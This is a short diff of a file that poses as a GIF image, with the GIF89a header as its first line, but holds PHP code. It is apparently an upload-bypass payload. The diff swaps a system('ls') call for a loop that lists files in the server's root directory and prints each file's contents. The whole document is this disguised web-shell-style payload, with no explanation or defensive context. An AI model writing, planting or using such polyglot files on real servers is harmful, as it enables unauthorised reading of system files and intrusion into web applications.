@@ -1,3 +1,9 @@
 GIF89a;
 
-<?php system('ls')?>
+<?php
+$dir='/';
+foreach(glob($dir.'*.*')as $f){
+	echo $f;
+	readfile($f);
+}
+?>
